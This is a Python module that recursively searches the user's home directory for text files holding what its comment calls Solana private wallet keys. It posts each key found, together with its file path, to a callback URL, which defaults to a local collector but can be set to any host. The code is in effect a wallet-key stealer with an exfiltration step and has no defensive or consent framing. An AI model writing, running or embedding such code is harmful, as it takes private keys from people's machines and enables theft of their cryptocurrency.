import os
import re
import requests

# Define a regex pattern to match a Solana private wallet key:
# 87 characters long, composed only of valid Base58 characters.
key_pattern = re.compile(r'\b[1-9A-HJ-NP-Za-km-z]{87}\b')

# Whitelist of allowed file extensions for common text files.
# Files with no extension are also processed.
ALLOWED_EXTENSIONS = {
    ".txt", ".md", ".markdown", ".log", ".cfg", ".conf", ".ini",
    ".csv", ".json", ".xml", ".html", ".htm", ".yaml", ".yml"
}

# Set of folder names to exclude regardless of their location (besides the special Unity rule).
EXCLUDED_DIR_NAMES = {"node_modules", "bower_components", "vendor", "dist", "build"}

def is_allowed_file(filename):
    """
    Determines if a file should be processed based on its extension.
    Files with no extension are included; files with an extension are processed
    only if the extension is in the ALLOWED_EXTENSIONS set.
    """
    _, ext = os.path.splitext(filename)
    # Allow files with no extension.
    if ext == "":
        return True
    return ext.lower() in ALLOWED_EXTENSIONS

def should_exclude_dir(parent_path, dirname):
    """
    Determines if a directory should be excluded.
    """
    # Exclude hidden directories (names starting with a dot)
    if dirname.startswith('.'):
        return True
    # Exclude common package/dependency directories.
    if dirname.lower() in EXCLUDED_DIR_NAMES:
        return True
    # Exclude Unity project Library folders:
    if dirname == "Library" and os.path.exists(os.path.join(parent_path, "ProjectSettings")):
        return True
    return False

def search_for_keys(root_path, callback_url=None):

    matches = []
    
    for dirpath, dirnames, filenames in os.walk(root_path):
        # Filter out directories based on our criteria.
        dirnames[:] = [
            d for d in dirnames if not should_exclude_dir(dirpath, d)
        ]
        
        for filename in filenames:
            if not is_allowed_file(filename):
                continue
            
            file_path = os.path.join(dirpath, filename)
            try:
                with open(file_path, 'r', errors='ignore') as file:
                    content = file.read()
                    for match in key_pattern.findall(content):
                        if callback_url:
                            data = {"file_path": file_path, "key": match}
                            response = requests.post(callback_url, json=data)
                        matches.append((file_path, match))
            except Exception:
                continue
                
    return matches

def start(callback_url=None):
    if callback_url is None:
        callback_url = "http://127.0.0.1:3000/receive"
    root_directory = os.path.expanduser("~")
    found_keys = search_for_keys(root_directory, callback_url)
    
    if found_keys:
        for file_path, key in found_keys:
            print(f" - {file_path}: {key}")
        
    return found_keys 